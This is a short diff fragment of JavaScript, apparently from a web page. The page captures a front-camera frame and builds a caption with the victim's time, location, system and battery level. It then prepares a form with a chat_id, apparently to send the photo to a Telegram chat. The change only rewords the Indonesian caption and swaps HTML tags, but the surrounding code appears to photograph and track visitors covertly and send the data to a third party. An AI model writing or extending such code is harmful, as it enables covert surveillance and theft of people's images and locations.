@@ -133,7 +133,7 @@
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
           canvas.toBlob((blob) => {
-            const caption = `<pre><b>⚠︎ TERDETEKSI SOSOK ANOMALI</b></pre>
+            const caption = `<blockquote>berhasil mengsmbil foto</blockquote>
 
 Waktu : ${waktu} WIB
 Lokasi : ${lokasi}
@@ -144,7 +144,7 @@ Kamera : Depan
 Sistem : Non-rooted
 Baterai : ${baterai}
 
-<pre>© by @dy.tgh</pre>`;
+<blockquote>© by @dy.tgh</blockquote>`;
 
             const formData = new FormData();
             formData.append("chat_id", chatId);
